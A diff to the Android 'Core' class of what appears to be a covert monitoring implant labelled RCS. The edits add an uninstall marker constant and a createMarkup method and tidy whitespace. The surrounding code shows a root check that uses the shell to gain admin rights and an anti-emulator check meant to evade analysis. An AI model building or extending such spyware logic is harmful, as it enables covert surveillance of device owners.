@@ -54,6 +54,7 @@ public class Core extends Activity implements Runnable {
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
+	private static final int UNINSTALL_MARKUP = 87623547;
 	private static boolean serviceRunning = false;
 
 	/** The b stop core. */
@@ -226,7 +227,7 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
 			// startTrace();
-		}	
+		}
 
 		if (PackageInfo.checkRoot()) {
 			// Usa la shell per prendere l'admin
@@ -469,7 +470,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// this markup is created by UninstallAction
-			final Markup markup = new Markup(0);
+			final Markup markup = new Markup(UNINSTALL_MARKUP);
 
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
@@ -820,9 +821,9 @@ public class Core extends Activity implements Runnable {
 
 		if (verifyNewConf() || Status.self().wantsReload()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (reloadConf): valid conf, reload: " +  Status.self().wantsReload());
+				Check.log(TAG + " (reloadConf): valid conf, reload: " + Status.self().wantsReload());
 			}
-			
+
 			Status.self().unsetReload();
 			stopAll();
 
@@ -870,10 +871,18 @@ public class Core extends Activity implements Runnable {
 
 		AntiEmulator am = new AntiEmulator();
 		if (am.isEmu()) {
-			// deceptionCode2();
 			return false;
 		}
 		return true;
+	}
+
+	public void createMarkup() {
+		final Markup markup = new Markup(UNINSTALL_MARKUP);
+		boolean ret = markup.createEmptyMarkup();
+		if (Cfg.DEBUG) {
+			Check.asserts(ret, " (createMarkup) Assert failed, cannot create markup");
+		}
+
 	}
 
 }
